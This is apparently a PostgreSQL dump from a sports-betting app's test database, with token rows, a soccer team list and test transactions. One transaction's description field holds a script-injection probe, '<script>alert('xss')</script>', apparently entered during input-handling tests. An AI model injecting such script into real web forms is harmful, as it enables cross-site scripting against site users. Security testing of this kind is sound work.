a5705a75-3232-48aa-9e0b-b664272fe787	6d9f9662-688c-487c-8301-95625d842b7e	O88W94n76vJBtlu4534GDx3nOGeKz2dXPk+IY0tQRpp+nT3yKvNKyqGQ30MuB2oaXJWXvrKN+H9D3Y8/ezWUeQ==	2025-11-21 20:53:34.553852-06	2025-11-14 20:53:34.553852-06	f	\N
87dbca62-8879-4e48-bacd-e0032f38668c	b70d5a3c-c776-4795-9caf-f83e60b822a4	QQVO6ZHXq/Dg1O89EEYC+tMaXjWEa/Bf2oDAe5eU0Bj/s/eu6YlU3lLMXkkwbLcW0Sl3VPrhxoSMC4ofgOTDiA==	2025-11-21 20:53:34.553931-06	2025-11-14 20:53:34.553931-06	f	\N
c171e523-f623-4026-b05e-dc07eec2e038	9d7aad08-481e-4dfb-aaaa-3bec95827c10	6qTLIvOmhav9Y6PrZI/FqVkpZfD1KgLWM2gYibWsnr2nkxgRjO20RmiPGFJsNP8rBOyJlPieDfwBPAGsAweMFg==	2025-11-21 20:53:34.554549-06	2025-11-14 20:53:34.554549-06	f	\N
8e68c9e0-927c-4f24-94ae-672014ef6abb	bafd125b-cb44-47f1-9a25-93b69e7483ef	/eSZOMiHjSC06WVbgfGrIT45O0Me0XSyAYCMUGelpvsn4KPfnmPTLVgj6OEpcUkg7hgg3aUcoUH7RIyWovgMMg==	2025-11-21 20:54:39.677086-06	2025-11-14 20:54:39.677086-06	f	\N
fdc712cc-a333-4245-9f3f-e11c4443f538	d079c970-6efb-4cf8-a8e1-baef89819fcc	URPfmWDxfY6yfhsjaGaE5qRt6KGTmxdpMB/89uRC3LMH8XuuzFcgL8ebqelr0+LhN+h6gbB7wKRWpteh0U8JFA==	2025-11-21 20:54:39.677087-06	2025-11-14 20:54:39.677087-06	f	\N
0256542c-9adf-40f5-bec6-25a31c64e01e	e13aba69-091f-423e-a362-22d6dd26c14e	/S7EkIvPPSuZ8ghduJw2F7NeofQ4K0wG9ODpDFDUZ4lrbogqYFO5dOR/AugLycEn3+AzZOKYfoAqstaWGL10wQ==	2025-11-21 21:46:15.278077-06	2025-11-14 21:46:15.278077-06	f	\N
3bb32678-fc8a-43af-a499-6f5a08611927	647ff2c3-4dd7-4778-b390-bd6c0f32dff0	/9TZ/csVggoCmaC/tok/aaO6lAbb4C3q8biaEZsesM8ceUenN8iMYoRemCrHXRMxmDgH01VXmD7ecP3eVrjYcg==	2025-11-21 21:46:47.58902-06	2025-11-14 21:46:47.58902-06	f	\N
36ad6fef-db81-48e3-b421-559efee9ae5c	e6535c73-b40c-462d-8faa-aab8cf8e6f01	kX11zuo7ahiUK2QcPQNZwzU4CO2HERoTkJVb9OQLqPmsMak5oqkXSrTIDBeqZeyIJ/xdgPhxXdunG4FsbaaSZA==	2025-11-21 21:46:47.759106-06	2025-11-14 21:46:47.759106-06	f	\N
84080011-738f-4208-8597-fbab10d15885	b2503a1c-4e2c-4fdd-832e-fe27ce7627fa	vJwswFKLfxOVlRcvvIyOLbsTy6Cw2PvfZ1TUmFpsgKiHUqXHOISE5onivilOGwBG3ocPKZIwJhv8caW+dwAbIQ==	2025-11-21 21:46:47.909895-06	2025-11-14 21:46:47.909895-06	f	\N
cc6d20e3-dc93-488f-aa1a-44f9477a7425	1ef7db4b-d2b3-49ee-a985-ef4034978689	A9BxmlHT2Q1A7vSCGDoZ1717o7US9aLZltJbrwRpTt8I5unNnEx62nMaqgOEwtLhsdKc6LPNtNW9iq3cKovPKw==	2025-11-21 21:47:33.53713-06	2025-11-14 21:47:33.53713-06	f	\N
8415c891-cb8e-4b80-a065-fb587976b16c	c2348e10-104f-41f8-8b95-f1a9ab066f6e	N1Mv+mze2LckGLFUHb1V9JPImjFAO23FddLsufq3HwhyU5dcrPhddbU1g9kYru5DImFwkcpOsR1iQJHNGDwULg==	2025-11-21 21:47:33.638224-06	2025-11-14 21:47:33.638224-06	f	\N
74200e3a-69f7-4590-a3f1-02793474858d	1ef7db4b-d2b3-49ee-a985-ef4034978689	jKFBGg0hCPoZINctqONBzJ5Pc0O/wqHgFbK2kpBYv1vFZbB1UDrB5+x0VJ6ty/V2AEt8ELCxhF6vLOShlYHQBQ==	2025-11-21 21:58:33.671731-06	2025-11-14 21:58:33.671731-06	f	\N
63edb38b-f212-41fa-817a-bf9348cf82de	c2348e10-104f-41f8-8b95-f1a9ab066f6e	X63wUAyNzhLwyh+XZZHFHclxrXUfq3SucEc1eUCsKBqQ/KOdA9jc0GEuj2di4jc5vyGoQELQKtcQ7FHsuGoO7w==	2025-11-21 21:58:33.772944-06	2025-11-14 21:58:33.772944-06	f	\N
df65a32e-b5da-4d7f-9837-29d9f2d0041b	c2348e10-104f-41f8-8b95-f1a9ab066f6e	7Yec2s19ezhS/jVB8pQCGaE8EF201emGbUN8aoWawwtSNGXUDXYHSlqXsqSzjKBAZ+Nfc6q5aj4RGNstkC1ciA==	2025-11-21 21:58:33.891349-06	2025-11-14 21:58:33.891349-06	f	\N
518ce591-ed50-4407-bbf8-a0b21f6d1bee	093f6af7-5a7a-4c41-a4fd-4323ee0c501f	NpNGuGJuoF8B3EUaED3WVY3xX3KvTOBXZYAPeQtCgZsVuUr6ONMHco2cuwBOR20TbBQalv9SsttVQ9o/m/EPhw==	2025-11-21 21:58:33.990955-06	2025-11-14 21:58:33.990955-06	f	\N
833a8cc9-a7ed-4bc4-a500-1a711ad720f7	093f6af7-5a7a-4c41-a4fd-4323ee0c501f	BTMVVUL+cMcxQhEJZrpp4nv0dUJuMS5gtnb8wqAbpZAHMUFg8ZZzNOwgXkyvwkmsYPxNhMbj5xErn+aylvhSXQ==	2025-11-21 21:58:34.101873-06	2025-11-14 21:58:34.101873-06	f	\N
1c9dae27-7a3a-4f48-9c76-24372aad4f73	1ef7db4b-d2b3-49ee-a985-ef4034978689	uTmTc5yMcBTRhTwe7f4UE0kD0tghDMdlXFS4ekPEU7deohYZHY+sDRgikEPUPBUhLpnnMb7UpmByZfCCEDU20g==	2025-11-21 22:02:45.224137-06	2025-11-14 22:02:45.224135-06	f	\N
2a08a849-b0e7-4753-9866-31e944309afb	c2348e10-104f-41f8-8b95-f1a9ab066f6e	m2hXmkzIh/XPAIB8OHSTI/WJu42otNEYhgS+GbYd9X367k0zhhn3A05WeG0x7mHxPsQ5R+00ygjetBiJpdbS3A==	2025-11-21 22:02:45.4057-06	2025-11-14 22:02:45.4057-06	f	\N
1b8e5287-e677-445f-a6bf-d83958e0a294	e13aba69-091f-423e-a362-22d6dd26c14e	3aSY+FpZJxbA4yYVbxn3Yh+jTiZRaw95vX75cOZs6B+NsRqJi6DFfB1R7NJTmZNstf/azogOFPSV+SF99deY6g==	2025-11-21 22:02:45.568322-06	2025-11-14 22:02:45.568322-06	f	\N
30835d3c-4317-4355-85e0-a5430d9d1656	1ef7db4b-d2b3-49ee-a985-ef4034978689	MdGgDur8CgfXpuOivFN1+JbcX93mfkSGJq5J9QSU17STNaN9nSFE6W6flgdjDmGkIGDQkArnpCI4sa0j3tJ5qg==	2025-11-21 22:04:16.798385-06	2025-11-14 22:04:16.798385-06	f	\N
443f5357-4e70-4486-94e8-edaa6d79ead5	c2348e10-104f-41f8-8b95-f1a9ab066f6e	ASMUH4IUJmIf5C/yWgHKlXzA+jpysXzSMQJnz0NojVatEQykBQJTtlmScWUqWehXcXzJntfH5+KkqG/yP44Dtw==	2025-11-21 22:04:16.935814-06	2025-11-14 22:04:16.935814-06	f	\N
2a36ea1e-ef6d-43e5-b145-6202bd7e29bf	e13aba69-091f-423e-a362-22d6dd26c14e	lD+bszpaEzyrMX12YxpXsJ4UE9mCiyhIjn7kVt6uqr/PXZNp/joji962Vc8+5olcLyFdF4xQafDetFA+MdIPGg==	2025-11-21 22:04:17.036056-06	2025-11-14 22:04:17.036056-06	f	\N
6948364e-8a26-42b5-b4f5-4f58c53b9d9e	1ef7db4b-d2b3-49ee-a985-ef4034978689	ETUbLvKpuYGwQkqhylkBL7melE20T5g4G3CNeEPRuAV+SYhSoXJskK5poTQ2JBC5w1hXj5tOshRHpkti+CbPcQ==	2025-11-21 22:05:21.515602-06	2025-11-14 22:05:21.515602-06	f	\N
9b4a4a22-df10-44f5-bb50-10cddc74c588	c2348e10-104f-41f8-8b95-f1a9ab066f6e	FPrQ94o0aDTk+AlzxK2lK3ObI8iqv725lFO9Awqv9S4h/RLK5bhAia30D6KGi7hhzzszkfE6Ar/ff6lW0wUPMA==	2025-11-21 22:05:21.615433-06	2025-11-14 22:05:21.615433-06	f	\N
fb5dd9d3-2a73-46e3-8526-c37f58004228	e13aba69-091f-423e-a362-22d6dd26c14e	IkOqMnbTtaeAD39ZJouprA0xeOJgyiSZdgeZMzqTQylksiEG4CsrVCY6QAMEDzbRW8Hf45JcMD6zeXB5QORWZQ==	2025-11-21 22:05:21.715385-06	2025-11-14 22:05:21.715385-06	f	\N
b52b1277-e984-47a7-a9b2-02989077920f	e13aba69-091f-423e-a362-22d6dd26c14e	cEJWLh58f6LO5wueaz7mgJYZ59MAbwtiNugeBgsdCmMe/z88m4tG/yeuxla8e6bfjfZHsjCbUtokghF0DhCAQg==	2025-11-21 22:07:19.987935-06	2025-11-14 22:07:19.987935-06	f	\N
21886c23-866d-4c9e-8d5e-2648d0fa2b45	1ef7db4b-d2b3-49ee-a985-ef4034978689	X8wRpDEEqD6/9z1TcDKNxvf92iOyMK0IzApkYCUnULVfvDMqCu3oDo1SLdza/Yxq0mOv0QH4zgOnhLEtJ73kSw==	2025-11-21 22:08:01.287284-06	2025-11-14 22:08:01.287284-06	f	\N
5feef0f2-ab7a-4ac5-b9b8-b3fd0d4bca53	c2348e10-104f-41f8-8b95-f1a9ab066f6e	KDFGaYlu4X45gUixhZ2qR809RWX4OCaZMSCPYUL82/v/peOOErETPcSX2ousHEASGJzRfKW3o4hETN4x+w1bSw==	2025-11-21 22:08:01.459621-06	2025-11-14 22:08:01.459621-06	f	\N
69bae6c3-8e2b-47f5-88d6-f510d9c6d124	e13aba69-091f-423e-a362-22d6dd26c14e	gCV/6Uu/UCSN6KiuUKrfsOqHsKA3ulq5+6l0VEDhdA6rSwHnnAjk7ugDIEPTNbbfYSPTj4h0JemUc7Q8YnlDWQ==	2025-11-21 22:08:01.561195-06	2025-11-14 22:08:01.561195-06	f	\N
bb8061de-1789-4d40-8ce5-962ca74b76e6	c2348e10-104f-41f8-8b95-f1a9ab066f6e	K/VPRj6Mk/Qcejj2Z2NOto8QVVx06W0gMd/6paWK8BRwAb4buanOZ+P4FQ/1rYFIUd8bp9uzGjPxRovotDZIzA==	2025-11-21 22:12:30.894073-06	2025-11-14 22:12:30.894073-06	f	\N
12dccffa-b959-4b54-b10d-073c8b634fc3	1ef7db4b-d2b3-49ee-a985-ef4034978689	59hj609j9vczt7x+N1sRQ5d0yEZhK3rr80qftJgKsO7RdG1+OHPIXmMerfb9hzpEZo1arQJI4stTKTsnsj7+Kg==	2025-11-21 22:12:31.091653-06	2025-11-14 22:12:31.091653-06	f	\N
39305943-94fb-4ee4-8b8f-d117087cc49a	e13aba69-091f-423e-a362-22d6dd26c14e	+4yjXktuTASPHTCJHBzowkJWzy9gWtq533A/Kbp1V+ShWpFaVGs8AnCwZyk2S+/WjcHAD4lIrj6xFoE0TjalyQ==	2025-11-21 22:12:31.262637-06	2025-11-14 22:12:31.262637-06	f	\N
06ccb8af-5c0d-4d7c-b35c-c238e5ed66b0	e13aba69-091f-423e-a362-22d6dd26c14e	QoAmAkkSduzOWrx/Uu6NdkQO4fw51b/xZeu0wc+ntQoyEMq7np4C11K4wKJsPNCVqBUPzWPhmoRgPtKti++I1Q==	2025-11-21 22:15:01.854808-06	2025-11-14 22:15:01.854808-06	f	\N
6dba2d61-3fc1-4589-b616-69907a38540d	1ef7db4b-d2b3-49ee-a985-ef4034978689	RT16IPlzb1E6oX/DCrPymekb6YzwOPICFNclxoHHOIGd1bgmjRyJh/nwU0HjjipiB5daTbYUV3RqkNOhkW/zRQ==	2025-11-21 22:15:02.0418-06	2025-11-14 22:15:02.0418-06	f	\N
e26b15bb-1cef-4ee3-85fe-7851695adab4	e13aba69-091f-423e-a362-22d6dd26c14e	zFCWUzZvY9LeHHswoxaAzksfZtCVV3obm1kLVKkmJILbgK7KUqCxP8EVg8xWODaOGG5/fIZchNyty014C/vFSw==	2025-11-21 22:15:02.14331-06	2025-11-14 22:15:02.14331-06	f	\N
e7e42dd1-7da7-4244-9bf3-6219c2ca19e0	1ef7db4b-d2b3-49ee-a985-ef4034978689	gvYj2dw8atX+RA9x03Fbk5EWLnGVZwtprNuX21Gh9wM02oWlmPiuSBlIRxOdIg9IiXoO3LGN4u9hBcBqTNnKfA==	2025-11-21 22:19:29.933469-06	2025-11-14 22:19:29.933469-06	f	\N
0f809734-d3af-4d1f-b3e0-8c09452b28e8	e13aba69-091f-423e-a362-22d6dd26c14e	7Mdc1MpIxMGFOXK4Z89IM1g4dIlC/1rb1l7tGvPzPyFbslV9ElfGzXDH9D7FYz00JsC2N3E6LPFjewEQFgNhDQ==	2025-11-21 22:19:30.03389-06	2025-11-14 22:19:30.03389-06	f	\N
79ece3f0-9aa3-4c85-a52c-f773be430852	1ef7db4b-d2b3-49ee-a985-ef4034978689	suH/C9dej8ZJsxFGW1HrEfvKWK8fA2pLTQICkLwVjECtwfAj2f9LuLGenbfKEcTsHGeUthN+4gFV9T+2E0pAYw==	2025-11-21 22:20:10.493224-06	2025-11-14 22:20:10.493224-06	f	\N
e107d85d-cbd8-4066-936d-ab79429ca0ec	e13aba69-091f-423e-a362-22d6dd26c14e	opybCVea9qJ8PolcLhMcvWSNP6wfBv0zMlnt6e4Ezavx6MhJOOX9CV8OhVTIn4LXWeuMYybhgHel5OeZWv+mEA==	2025-11-21 22:20:10.592539-06	2025-11-14 22:20:10.592539-06	f	\N
00d7423b-89d5-4afa-873b-2d5a204473ac	1ef7db4b-d2b3-49ee-a985-ef4034978689	VQatdfXi8SBtZ8s9mb0gMjGk8euSwmq9lAI7N3Pg9WF7LxBEqjDHMfzRuKd5IySbfWO4/CuY7SvlfnGZWMmxAA==	2025-11-21 22:20:37.023366-06	2025-11-14 22:20:37.023366-06	f	\N
b4eb0d76-fd6a-4a08-a6f8-9f86a6999a14	e13aba69-091f-423e-a362-22d6dd26c14e	cbWDGDeeLaY407HD7Ta20ewCQZmkUSwCa5pinRQ2FtK9bQkOY9T958F1pncgbDaILe6lo63uzVI9Fm2RQLvpRg==	2025-11-21 22:20:37.127554-06	2025-11-14 22:20:37.127554-06	f	\N
bb258dd9-9ba7-4617-b765-ff15a6fa76a3	1ef7db4b-d2b3-49ee-a985-ef4034978689	kAw25dduveGkAiH4zh2FW2xs8vxHyil8Ns/kJ1HNQ3HNc5D2FBe9i8IRmBCncHNC82L1gFqu0txoX8wk5BfDGA==	2025-11-21 22:21:56.196689-06	2025-11-14 22:21:56.196689-06	f	\N
3d5c7df0-1c1b-494c-969b-1897e9c974c4	e13aba69-091f-423e-a362-22d6dd26c14e	KnXky0UnAM50W/adTNNTK95ujSyYIxKXhqvdFcwZe8yrPatdqGh+VCSK/SJyYWSfXIqd5EDGKP5lRZzCPrl6VQ==	2025-11-21 22:21:56.296461-06	2025-11-14 22:21:56.296461-06	f	\N
949846fe-1305-45a5-aae7-d7a76e8a2a84	e13aba69-091f-423e-a362-22d6dd26c14e	7HQ6hmTnA9cf2tZ2/JgkHoyhaiB46RWAmoF36A8PBnbbGVNPTdwQyx1KWAaGUmYyPOEeTG/DFOZlrW+Hk8LuTQ==	2025-11-21 22:26:05.735321-06	2025-11-14 22:26:05.735321-06	f	\N
d7ebb450-82e5-4efa-80dc-dfca7942af39	1ef7db4b-d2b3-49ee-a985-ef4034978689	iyAXTaAMPTjv3h6htGPS7KDA7qjT/Cp3BzcZN5u1Dj6vzJdxc/1f3DTpkStlHSaLDc1/FH4JUoRCtL1WrUc5tg==	2025-11-21 22:26:05.871283-06	2025-11-14 22:26:05.871283-06	f	\N
8ef306d5-1b41-44ca-9d8d-beae2c9a3219	e13aba69-091f-423e-a362-22d6dd26c14e	DMVnuvtheHDuHu6kPsQhUWTI/N5rFdhYB5MB7rrJv/eMChCTw3RL+WYZgO8RvWaXsbDWCHuJHdglJZW78Z/Wlg==	2025-11-21 22:26:05.984001-06	2025-11-14 22:26:05.984001-06	f	\N
623602bb-de7c-47ba-89a8-e942865ae7bf	91966209-ca29-439d-bea5-ea8b3a0dc2b0	TY7AdW9R4ovBXfAKgOhEs5Wkj2uA4k/NR494pX5OuseGPZhOe58xARPbXz1oDy+EOC+6fvKdHHoi7p5FeOHDwA==	2025-11-21 22:30:52.557318-06	2025-11-14 22:30:52.557318-06	f	\N
1cf1ac7a-c1e0-4a1c-a5da-2c547da52348	b2503a1c-4e2c-4fdd-832e-fe27ce7627fa	F0ZiFtuvg/Qv4wSyoeJ3DnBsbLCUcW6tP+0+ip0wfby3OQRNYYYAJVS5lzuWE+zNsmDA7Sl5guimMyM123XqMg==	2025-11-21 22:30:52.770872-06	2025-11-14 22:30:52.770872-06	f	\N
c20d4d1b-2259-41b8-9c73-3fac955b0ce8	838d44ed-4447-480a-91c6-5011bb11369f	x/t3oQNergsWbmzGwus3WWz70LU4fJtfJM+K5tXODR6wtb7ksr/N2I6vZ4tvuaOn3MNIkmESzBWjdNaXz94S+A==	2025-11-21 22:30:52.991875-06	2025-11-14 22:30:52.991875-06	f	\N
7c4f13b1-e4f8-4a50-8432-620f69ae18ce	d1a9d8b1-5121-4415-b1ab-a79c02995c3e	dhiIi3vrLKZs+NcqdVXOD6Da/r9xfaHS7Co8mK2jyyhh4LUdMwd1eiZQLEqOAJhD04HOIgqiKJR1jjMM1+4Dvg==	2025-11-21 22:30:53.210766-06	2025-11-14 22:30:53.210766-06	f	\N
355528be-41f7-4d16-b4df-94a6428bb484	d029350a-0055-40fd-961b-07c65072613a	nM3PyhN6nVU/tyvLhW25HqkfBOCWkvWPwIeILVUFjXJVBIzENps24NpQdltCjjfT+fD2t9vcrqnNJ4Ddr5VSVw==	2025-11-21 22:30:53.431342-06	2025-11-14 22:30:53.431342-06	f	\N
6bac3266-2280-4988-95af-1c1f79d094c0	ce40595a-26f8-4659-a937-82dee702c2a8	wZ1VSwaV8fXAg1BLCMVDkfe3NI2KZwPj9NVR0V/A7mRXwt9asowu5hnnWewfkm3JEzPZcnW/Rjz7x0SBpoynqw==	2025-11-21 22:32:53.963835-06	2025-11-14 22:32:53.963835-06	f	\N
f792e213-e90d-4de9-821a-0a931a60410b	647ff2c3-4dd7-4778-b390-bd6c0f32dff0	JPoirAEpU35S99TG35/yoaknY+Van0F9n0Xd8LGl/6u01zGBd0oUbeh8b57X3ZPOcetoELkXLAzEFq+KRDO7TA==	2025-11-21 22:33:30.815485-06	2025-11-14 22:33:30.815485-06	f	\N
04352c47-619b-4e6f-ae71-b0d57ff5986c	e6535c73-b40c-462d-8faa-aab8cf8e6f01	GPme5NgOtW1urGJN3luT3DaCn583wwk+bqa4zQi1jwR44Mf4lsBJn8SAdFTM1/xtP/lCoyKhCUt/zij9SpwBwg==	2025-11-21 22:33:30.957617-06	2025-11-14 22:33:30.957617-06	f	\N
57f34f3f-6b4c-4bb6-8d14-1564af160534	7e58c576-a98a-4973-8835-1b542aad3459	piLrknu172S+E8fyguRs6PBX10vsopQa31jCnC0mSiO3bLnHptBpOkfFYNeWhiXSLKKOTnESymWRCemUjyqzrQ==	2025-11-21 22:33:31.096355-06	2025-11-14 22:33:31.096355-06	f	\N
00f5e2ab-dd97-4328-beab-16c3a56b465d	4a4c880b-41ed-4713-965f-de25d4d341cd	Im7dhDytPjoTul79fL0Y6QvCXw6ptzKsFjhfaZNQ4/0qjIu2tfEHt1Ghzn82SpSlXsVaND/dLC9MoEgcxh3ViQ==	2025-11-21 22:33:31.238241-06	2025-11-14 22:33:31.238241-06	f	\N
a7e477ed-7b54-44f7-9c25-0537a7e5348b	29e88d16-814c-4d63-ad9a-01dc4240710e	oIR0z2vqFkuM7Q1ES46+UBVbYjzqE4PBnCfHznRmEqroVpV2INabqStDeKgkQb0RkdJ1DcSyT4rNgMC6yUGqyg==	2025-11-21 22:34:15.314134-06	2025-11-14 22:34:15.314134-06	f	\N
58fc9561-f64b-477e-81f1-8f868d551a3d	773b8d10-e105-47c6-ab53-9a3b26759637	qAOo5R9Jx1CzexiwpXE+OmE1vOazQ+9+PWxEv/gS/XyqoVMNAxJOI5I3vKWqsk9+m4o9oeYv+QtU13M7aMFqYQ==	2025-11-21 22:34:20.476383-06	2025-11-14 22:34:20.476383-06	f	\N
7d1d8a14-22f6-46e8-8d1a-39e3f558b929	8c09f1af-1515-4495-837c-6674da6d2be3	hJzkF3vsxsr8tgcl7nVUNFJ1XKcQbGV88jXMAkfJRkjO+yCR3pgLDHUGa3VyFmsioi4n3szT1ltVLUJJDX6eGQ==	2025-11-21 22:34:25.647617-06	2025-11-14 22:34:25.647617-06	f	\N
fa7f35e2-b541-43fa-a8eb-20a1c8741f5b	093f6af7-5a7a-4c41-a4fd-4323ee0c501f	ac/Lr1A7HHJ9JPxFhfo7PfIHwuGS/iMNmWdMeACCu7qFdR9PtJeBoLbiwP1DOYiFnwXHIvzOLv2QfH6aKoNnMg==	2025-11-21 22:34:30.831896-06	2025-11-14 22:34:30.831896-06	f	\N
678a6223-5c5e-4344-a7e4-3637484d69c1	ce40595a-26f8-4659-a937-82dee702c2a8	JfkXm67kRBiWzrzX4F5RuWg5ypgoo5Z+vZCOdupSUjTOkIrHhQqWv9EGS7wB/U4pnr9Q4mU5HB1coEexAmg5pg==	2025-11-21 22:34:35.994421-06	2025-11-14 22:34:35.994421-06	f	\N
b9536d48-b0de-4218-bd35-0cf494ac67a7	afab4f82-de2b-40c7-8000-0410e828e2b9	ocxu5K2sTclazLxKhvJuWkf22XRiJZOAGNLU3L1up1eYm2oeHLTxd1M04w7JJs/sblIViux7APQnRpNi47CrVQ==	2025-11-21 22:35:41.157186-06	2025-11-14 22:35:41.157186-06	f	\N
03e555ef-2f20-4f85-ae94-4acd07e6dc21	bafd125b-cb44-47f1-9a25-93b69e7483ef	vlf6QdJfSsJ5V7OMwsiyM80SP0UrIh/fIFGYOu67Mh2DAJBg0/G4AcsrcCX7ef87wN0SRWT9FCnaQLHZ6zDkIQ==	2025-11-21 22:35:46.320597-06	2025-11-14 22:35:46.320597-06	f	\N
28cc9db7-29a4-475e-b177-5c99bc281079	c47e3e35-7877-4802-8a02-02843973a1d4	ij77X3R8gWjOsM1mQvuwOjM/Yw9ReRlo+SH/1WFQ5TbrsI8pd1uGlJJuvOGS254lHeonROJ42p60/oHadQHktw==	2025-11-21 22:35:51.494729-06	2025-11-14 22:35:51.494729-06	f	\N
7a0a071a-983e-4412-9c56-c4775da9e92c	b70d5a3c-c776-4795-9caf-f83e60b822a4	Dj/PY430n1N+KfhLN0G82dFYj8Aibl5Z7h3hNF2lghroEAwKUx5573LhThcn1FVq6vuATL18Gt8kb71B90DnPA==	2025-11-21 22:35:56.653642-06	2025-11-14 22:35:56.653642-06	f	\N
88fa718d-b493-43b2-a2cd-ce344052a4ab	6d9f9662-688c-487c-8301-95625d842b7e	gBOL3bgXtXpBPPhedChhuFiRxY1gP3Oix3w60k5Qog68xm2aqpZqiVfnWQMX4Xz+N7AU+s4voqqlzVbEj9lGcQ==	2025-11-21 22:36:01.818616-06	2025-11-14 22:36:01.818616-06	f	\N
68d5b9b8-1f23-4de3-85cd-b001b62b1715	9d7aad08-481e-4dfb-aaaa-3bec95827c10	DkkkDct9FRWCrP5IAAPUX6bj3wdHMyKZG9/PPajAPPB1FhzWqCze0QsllmlY1anHfymFnc/twgY1YsJbJ0Q5YQ==	2025-11-21 22:37:06.974396-06	2025-11-14 22:37:06.974396-06	f	\N
64429cdb-f44c-4726-965c-c14cefaecd6e	db4ef871-1da4-4506-be39-f5d22ba1b4f6	DxY33KClHDBGPyRG0HKxtamUXTsa0nSl0hqTpCocDe1zLfSxPx8GumvSWq0gowbe1b4p8syR9e4dzqiuDhzIwA==	2025-11-21 22:37:12.131409-06	2025-11-14 22:37:12.131409-06	f	\N
e8c343b6-3d83-45b4-ab02-d99a3e2936b4	d079c970-6efb-4cf8-a8e1-baef89819fcc	X2uXObzKFshAaNzXDpIHiqPXVCfbdxSLJdLsh1R58e8GOmE7ksAXo4Yui2FC4VVuhoDxrXjMb8NUSWWEw4LePw==	2025-11-21 22:37:17.294954-06	2025-11-14 22:37:17.294954-06	f	\N
10c09ca6-716f-4143-8a15-f4d709d75fdb	1ef7db4b-d2b3-49ee-a985-ef4034978689	DS6mm17gZTKs8+DbuoaYXoZlOG4Kxv1Icbiqr+fTJD4SjNqJAr0RsncSQtFe4r0lkyWxu12vOk1Q+iX82agtnA==	2025-11-21 22:57:56.605101-06	2025-11-14 22:57:56.605101-06	f	\N
a738bda7-51f5-453f-a1c9-c180cc6c5622	e13aba69-091f-423e-a362-22d6dd26c14e	U6lFjMIQg+CryMkn2XKewCtsIzBI8U2lK4b0I94g23x7YbrBi/MUuJuOri+8eK/IhsggHP+LJoraqcUfiltpAA==	2025-11-21 22:57:56.705311-06	2025-11-14 22:57:56.705311-06	f	\N
3d7dc117-c850-4ec7-842b-bd5e08badf7d	1ef7db4b-d2b3-49ee-a985-ef4034978689	ngq4a19R/H20ZW39GvXEgaemakTYbVEdm7Yo6uKdxelMu22UWmk+VXEO+hC6zs2jeqWalxeBXZr9DqFgIKPqpA==	2025-11-21 22:58:34.885881-06	2025-11-14 22:58:34.885881-06	f	\N
656353fe-50c0-41b7-b083-1c9afdd9530c	e13aba69-091f-423e-a362-22d6dd26c14e	SLrUJ7kBIP/qOOpMt1E+AE8IxYjsioBrcK6KpMFhDi8bin/GUCMuqkB92rJ2PXlHTnjK0uE/ScQabL3+nC1Z5w==	2025-11-21 22:58:35.08164-06	2025-11-14 22:58:35.08164-06	f	\N
\.


--
-- Data for Name: Sports; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."Sports" ("Id", "Name", "Code") FROM stdin;
c44f70ac-88e7-4150-ab78-567845511786	Soccer	SOC
\.


--
-- Data for Name: Teams; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."Teams" ("Id", "Name", "Code", "City", "LeagueId", "LeagueId1") FROM stdin;
108a20ec-4c0c-4952-9269-dd065e4e35fb	Arsenal	ARS	\N	6c71d468-8de9-4776-acd8-72a9f8404060	\N
1b8bff5d-fe43-43b0-85c8-746070ddd593	Chelsea	CHE	\N	6c71d468-8de9-4776-acd8-72a9f8404060	\N
6fb766c0-2102-4a1a-9a79-63fd8647895a	Manchester United	MUN	Manchester	6c71d468-8de9-4776-acd8-72a9f8404060	\N
a420711c-b1ad-4dd2-88cf-fb582c621b04	Liverpool	LIV	Liverpool	6c71d468-8de9-4776-acd8-72a9f8404060	\N
a30873d5-ef58-47b8-b4fd-3914031c1ccd	Tottenham	TOT	London	6c71d468-8de9-4776-acd8-72a9f8404060	\N
3a3ace61-3d7e-48a2-9484-45002787779b	Manchester City	MCI	Manchester	6c71d468-8de9-4776-acd8-72a9f8404060	\N
\.


--
-- Data for Name: Transactions; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."Transactions" ("Id", "UserId", "Type", "ReferenceId", "Description", "Status", "CreatedAt", "CompletedAt", "Amount", "Currency", "BalanceAfter", "BalanceAfterCurrency", "BalanceBefore", "BalanceBeforeCurrency") FROM stdin;
ad2cf2e5-b947-4f34-8bba-b2abb47e2256	2a414a5c-f857-44fd-ae76-e3260c9382be	BetPlaced	a66182ac-f9ef-4a73-97a7-9b87c962ceed	Bet placed: BET202511142148114437	Completed	2025-11-14 15:48:11.912001-06	2025-11-14 15:48:11.912001-06	100.00	USD	4900.00	USD	5000.00	USD
e9957bf3-5df7-4241-935a-2ffa96828e55	2a414a5c-f857-44fd-ae76-e3260c9382be	Deposit	\N	Initial deposit	Completed	2025-11-14 15:48:11.910283-06	2025-11-14 15:48:11.910283-06	5000.00	USD	5000.00	USD	0.00	USD
99900263-6b2a-4b5d-8e8b-1ba2186dad09	2a414a5c-f857-44fd-ae76-e3260c9382be	Deposit	\N	Test deposit via API	Completed	2025-11-14 16:16:09.96545-06	2025-11-14 16:16:09.96545-06	500.00	USD	5400.00	USD	4900.00	USD
bda12011-f7c0-484c-a60e-6f47883fad77	2a414a5c-f857-44fd-ae76-e3260c9382be	BetPlaced	57be29ea-2a8a-4854-980c-54820bdcf8a9	Bet placed: BET202511142216198602	Completed	2025-11-14 16:16:19.14507-06	2025-11-14 16:16:19.14507-06	50.00	USD	5350.00	USD	5400.00	USD
4b2081b9-5f96-4445-9d05-25e2bee5e178	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Test withdrawal	Completed	2025-11-14 16:19:31.656999-06	2025-11-14 16:19:31.656999-06	1000.00	USD	4350.00	USD	5350.00	USD
7db90cac-6cc8-4196-8a7f-d97d7d8c7538	2a414a5c-f857-44fd-ae76-e3260c9382be	Deposit	\N	Tiny deposit	Completed	2025-11-14 16:21:55.396581-06	2025-11-14 16:21:55.396581-06	0.01	USD	4350.01	USD	4350.00	USD
2830a2f5-0fa6-40f7-934a-2dd819066425	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Withdraw exact balance	Completed	2025-11-14 16:21:55.600379-06	2025-11-14 16:21:55.600379-06	4350.00	USD	0.01	USD	4350.01	USD
49838166-2e20-4eed-8533-c06f13b3e7d0	2a414a5c-f857-44fd-ae76-e3260c9382be	Deposit	\N	<script>alert('xss')</script>	Completed	2025-11-14 16:26:51.509711-06	2025-11-14 16:26:51.509711-06	100.00	USD	100.01	USD	0.01	USD
